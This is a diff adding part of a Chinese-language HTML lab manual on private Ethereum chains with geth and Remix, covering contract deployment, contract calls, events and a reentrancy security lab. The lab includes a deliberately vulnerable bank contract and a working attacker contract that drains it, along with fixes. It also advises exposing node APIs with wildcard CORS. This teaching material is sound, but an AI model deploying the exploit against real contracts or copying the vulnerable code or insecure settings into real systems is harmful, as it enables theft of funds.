+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>Environment 显示已连接，Account 下拉出现 <code>0x...</code> 地址；点击账户可见其余额（与控制台 <code>eth.getBalance</code> 一致）。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e4-deploy">4.3 编译与部署</h3>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">编译</span>
+        <ol>
+          <li>在 <strong>File Explorer</strong> 新建 <code>SimpleBank.sol</code>，粘贴上述代码。</li>
+          <li>进入 <strong>Solidity Compiler</strong>，Compiler 版本选 <code>0.8.x</code>，点击 <strong>Compile SimpleBank.sol</strong>。</li>
+          <li>出现绿色对勾表示编译通过。</li>
+        </ol>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">部署（需先挖矿/解锁）</span>
+        <pre class="code" data-lang="javascript"><code>// 在 geth 控制台先解锁并挖矿，确保部署账户有 gas
+personal.unlockAccount(eth.accounts[0], "YourPassword123", 30000)
+miner.start(1); admin.sleep(2); miner.stop()</code></pre>
+        <ol start="3">
+          <li>回到 Remix 的 <strong>Deploy &amp; Run</strong>，选中 SimpleBank，点击 <strong>Deploy</strong>。</li>
+          <li>在 geth 控制台 <code>miner.start(1); admin.sleep(3); miner.stop()</code> 把部署交易打包。</li>
+        </ol>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>Remix 底部 <strong>Deployed Contracts</strong> 出现 SimpleBank 实例，展开可见 <code>deposit</code>、<code>withdraw</code>、<code>getBalance</code> 等函数；控制台 <code>eth.blockNumber</code> 已增长。</p>
+        </div>
+      </div>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障（实验四）</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td>Remix 连接后 Account 为空</td><td>geth 未开放 personal/admin，或节点未启动</td><td>确认启动带 <code>--http.api eth,net,web3,personal,admin,miner</code> 且节点在运行</td></tr>
+          <tr><td><code>Provider failed / callback error</code></td><td>CORS 拦截</td><td>启动加 <code>--http.corsdomain "*"</code>；浏览器用 http://127.0.0.1 而非 localhost</td></tr>
+          <tr><td>Deploy 后一直 pending</td><td>交易未打包</td><td>部署后务必 <code>miner.start(1)</code> 挖矿确认</td></tr>
+          <tr><td><code>out of gas</code></td><td>Gas 上限过低</td><td>Remix 中调高 Gas limit（如 3000000）</td></tr>
+          <tr><td>编译器报 <code>pragma</code> 版本不匹配</td><td>Solidity 版本不选</td><td>Compiler 选 0.8.x，与 <code>pragma solidity ^0.8.0;</code> 一致</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 实验五 ===== -->
+    <section class="exp" id="exp5">
+      <h2 class="exp-h">实验五　合约交互、查询与事件</h2>
+
+      <h3 class="sub-h" id="e5-call">5.1 调用与查询合约</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：call 与 send 的区别</div>
+        <p><strong>只读函数</strong>（view/pure）用 <code>call</code> 执行，不消耗 Gas、不改变状态，可免费本地模拟；<strong>写函数</strong>用 <code>send</code> 发起交易，需 Gas、需挖矿确认、会改变链上状态。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">存款并查询</span>
+        <pre class="code" data-lang="javascript"><code>// 在 Remix 已部署的 SimpleBank 实例中：
+// 1) deposit：VALUE 填 1 ether，点击 deposit
+// 2) 挖矿确认
+miner.start(1); admin.sleep(2); miner.stop();
+// 3) 调用 getBalance()（只读，立即返回）
+// 也可在 geth 控制台用 ABI 调用：
+var abi = [/* 从 Remix Compilation Details - ABI 复制 */];
+var addr = "0x部署得到的合约地址";
+var bank = eth.contract(abi).at(addr);
+bank.getBalance();          // 返回存款额（wei）</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p><code>getBalance()</code> 返回约 <code>1000000000000000000</code>（1 ETH 的 wei 数）。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e5-event">5.2 监听事件与日志</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：事件（Event）与日志</div>
+        <p>事件会被写入区块的<strong>日志（logs）</strong>，是合约向外「广播」发生的动作。链下程序（如 DApp、监控脚本）可订阅事件，无需轮询状态。事件参数加 <code>indexed</code> 后可被高效过滤（类似数据库索引）。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤</span><span class="step-title">查询历史 Deposit 事件</span>
+        <pre class="code" data-lang="javascript"><code>// 取合约地址后，在 geth 控制台：
+var abi = [/* SimpleBank ABI */];
+var bank = eth.contract(abi).at("0x合约地址");
+var evt = bank.Deposit({}, {fromBlock:0, toBlock:"latest"});
+evt.get(function(err, logs){
+  if(!err) console.log(logs);   // 打印所有 Deposit 事件
+});</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>返回包含 <code>args.who</code>、<code>args.amount</code> 的事件对象数组，证明存款动作已被链上记录。</p>
+        </div>
+      </div>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障（实验五）</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td><code>bank.getBalance is not a function</code></td><td>ABI 未含该函数 / 实例化失败</td><td>从 Remix 复制完整 ABI；确认 <code>at(addr)</code> 地址正确</td></tr>
+          <tr><td>读函数返回 0 / 旧值</td><td>写交易尚未打包</td><td>写操作后先挖矿再查询</td></tr>
+          <tr><td>事件监听无输出</td><td>fromBlock 设置过晚 / 未部署即查</td><td>设 <code>fromBlock:0</code>；确认合约已部署且发生过该事件</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 实验六 ===== -->
+    <section class="exp" id="exp6">
+      <h2 class="exp-h">实验六　安全实验：重入漏洞复现与防护</h2>
+
+      <h3 class="sub-h" id="e6-principle">6.1 漏洞原理</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：重入攻击（Reentrancy）</div>
+        <p>当合约在<strong>修改自身状态之前</strong>就向外部地址转账（如 <code>msg.sender.call{value:...}</code>），而收款方是<strong>攻击合约</strong>的回退函数（fallback）时，控制流会重新进入原合约的取款逻辑——在余额还没被扣减前再次取款，形成循环盗取。</p>
+        <p>经典顺序错误：<code>转账 → 再扣余额</code>；安全顺序应为 <code>先扣余额 → 再转账</code>（Checks-Effects-Interactions），或加<strong>重入锁</strong>。</p>
+      </div>
+
+      <h3 class="sub-h" id="e6-exploit">6.2 复现攻击</h3>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">部署存在漏洞的银行合约</span>
+        <pre class="code" data-lang="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+// ⚠️ 故意保留漏洞，仅用于教学复现
+contract VulnerableBank {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // 漏洞：先转账（触发外部调用），后改状态
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount);
+        (bool ok, ) = msg.sender.call{value: amount}(""); // 外部调用
+        require(ok);
+        balances[msg.sender] -= amount;                    // 状态更新滞后
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}</code></pre>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">部署攻击合约</span>
+        <pre class="code" data-lang="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./VulnerableBank.sol";
+
+contract Attacker {
+    VulnerableBank public bank;
+
+    constructor(address _bank) {
+        bank = VulnerableBank(_bank);
+    }
+
+    // 先存款 1 ether，再一次性取出（触发重入）
+    function attack() external payable {
+        bank.deposit{value: 1 ether}();
+        bank.withdraw(1 ether);
+    }
+
+    // 回退函数：只要银行还有钱，就继续 withdraw，形成重入
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw(1 ether);
+        }
+    }
+}</code></pre>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 3</span><span class="step-title">执行攻击并观察</span>
+        <ol>
+          <li>向 VulnerableBank 存入较多测试币（如 10 ETH，用普通账户 deposit）。</li>
+          <li>部署 Attacker，调用 <code>attack{value:1 ether}</code>。</li>
+          <li>挖矿确认后，查看 <code>bank.getBalance()</code> 与 <code>attacker 账户余额</code>。</li>
+        </ol>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>银行的余额被「抽干」到接近于 0，攻击者账户凭 1 ETH 本金反复重入，卷走了银行里几乎所有资金——直观演示了重入的危害。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e6-fix">6.3 防护方案</h3>
+      <div class="step">
+        <span class="step-no">方案 A</span><span class="step-title">Checks-Effects-Interactions（先改状态再转账）</span>
+        <pre class="code" data-lang="solidity"><code>function withdraw(uint amount) public {
+    require(balances[msg.sender] >= amount);
+    balances[msg.sender] -= amount;            // 先改状态
+    (bool ok, ) = msg.sender.call{value: amount}(""); // 再交互
+    require(ok);
+}</code></pre>
+      </div>
+      <div class="step">
+        <span class="step-no">方案 B</span><span class="step-title">使用 OpenZeppelin ReentrancyGuard 重入锁</span>
+        <pre class="code" data-lang="solidity"><code>import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract SafeBank is ReentrancyGuard {
+    mapping(address => uint) public balances;
+
+    function withdraw(uint amount) public nonReentrant {
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok);
+    }
+}</code></pre>
+        <div class="card note">
+          <div class="card-h">📌 实验要点</div>
+          <p>对比「漏洞版」「方案A」「方案B」三种合约在攻击下的表现：只有先改状态或加锁的版本能抵御重入。请记录攻击前后银行余额，并写入实验报告。</p>
+        </div>
+      </div>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障（实验六）</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td><code>import</code> 找不到文件</td><td>多文件未同处一个目录</td><td>在 Remix 同工作区放 VulnerableBank.sol 与 Attacker.sol；OpenZeppelin 需通过 Remix 插件或 paste</td></tr>
+          <tr><td>攻击未成功（银行余额未变）</td><td>geth 单线程执行，fallback 重入被当前交易锁定？</td><td>确认 withdraw 中转账在扣减之前；Attacker.receive 中条件正确</td></tr>
+          <tr><td><code>out of gas</code> 在攻击交易</td><td>重入循环消耗大量 gas</td><td>Remix 调高 Gas limit（如 8000000），私有链 gasLimit 已设较大</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 附录 ===== -->
+    <section class="exp" id="appendix">
+      <h2 class="exp-h">附录　常见报错速查表</h2>
+      <table class="tbl">
+        <tr><th>阶段</th><th>现象</th><th>一句话解决</th></tr>
+        <tr><td>编译</td><td>proxy.golang.org 连接失败</td><td><code>go env -w GOPROXY=https://goproxy.cn,direct</code></td></tr>
+        <tr><td>启动</td><td>genesis mismatch</td><td><code>rm -rf data0</code> 后重新 <code>init</code></td></tr>
+        <tr><td>启动</td><td>端口 8545 被占用</td><td>结束占用进程或 <code>--http.port 8546</code></td></tr>
+        <tr><td>连接</td><td>attach 找不到 ipc</td><td>先启动节点；路径用 <code>data0/geth.ipc</code></td></tr>
+        <tr><td>账户</td><td>account is locked</td><td><code>personal.unlockAccount</code> 重新解锁</td></tr>
+        <tr><td>转账</td><td>insufficient funds</td><td>先挖矿给发送方充值</td></tr>
+        <tr><td>部署</td><td>Remix 无账户/CORS</td><td>启动带 corsdomain/vhosts/api 参数</td></tr>
+        <tr><td>部署</td><td>交易一直 pending</td><td>部署/转账后 <code>miner.start(1)</code> 挖矿确认</td></tr>
+      </table>
+
+      <div class="card note">
+        <div class="card-h">📎 Windows / macOS 差异提示</div>
+        <ul>
+          <li>Windows 用户可在 <strong>WSL2 Ubuntu 22.04</strong> 中按本手册操作；直接在 cmd/PowerShell 跑 geth 亦可，但路径写 <code>C:\...</code>、分隔符用 <code>\</code>。</li>
+          <li>macOS 用 Homebrew 装 go（<code>brew install go@1.18</code>），其余命令一致。</li>
+          <li>Remix 网页端跨域访问本机节点时，浏览器地址务必用 <code>http://127.0.0.1:8545</code> 而非 <code>localhost</code>。</li>
+        </ul>
+      </div>
+
+      <div class="card principle">
+        <div class="card-h">🎓 学习小结</div>
+        <p>完成六个实验后，你应理解：私有链如何由创世文件诞生；账户、nonce、Gas 如何支撑一笔转账；智能合约如何编译部署到 EVM；以及「先改状态再交互」这一关键安全原则。建议把每个实验的<strong>预期结果截图 + 报错排障记录</strong>整理进实验报告。</p>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<button class="backtop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="回到顶部">↑</button>
+
+<script>
+  // 语法高亮
+  if (window.hljs) { hljs.highlightAll(); }
+
+  // 代码块复制按钮
+  document.querySelectorAll('pre.code').forEach(function(pre){
+    var btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = '复制';
+    btn.onclick = function(){
+      var code = pre.querySelector('code').innerText;
+      navigator.clipboard.writeText(code).then(function(){
+        btn.textContent = '已复制';
+        setTimeout(function(){ btn.textContent='复制'; }, 1500);
+      });
+    };
+    pre.appendChild(btn);
+  });
+
+  // 侧边目录：滚动高亮当前章节
+  var links = Array.prototype.slice.call(document.querySelectorAll('nav.sidebar ol.sub a'));
+  var map = {};
+  links.forEach(function(a){
+    var id = a.getAttribute('href').slice(1);
+    var el = document.getElementById(id);
+    if (el) map[id] = a;
+  });
+  var observer = new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if (e.isIntersecting){
+        links.forEach(function(l){ l.classList.remove('active'); });
+        var a = map[e.target.id];
+        if (a) a.classList.add('active');
+      }
+    });
+  }, {rootMargin:'-10% 0px -80% 0px', threshold:0});
+  Object.keys(map).forEach(function(id){
+    observer.observe(document.getElementById(id));
+  });
+
+  // 目录搜索过滤
+  function filterNav(q){
+    q = q.trim().toLowerCase();
+    document.querySelectorAll('nav.sidebar ol.sub li').forEach(function(li){
+      var t = li.textContent.toLowerCase();
+      li.style.display = (!q || t.indexOf(q) >= 0) ? '' : 'none';
+    });
+  }
+</script>
+</body>
+</html>
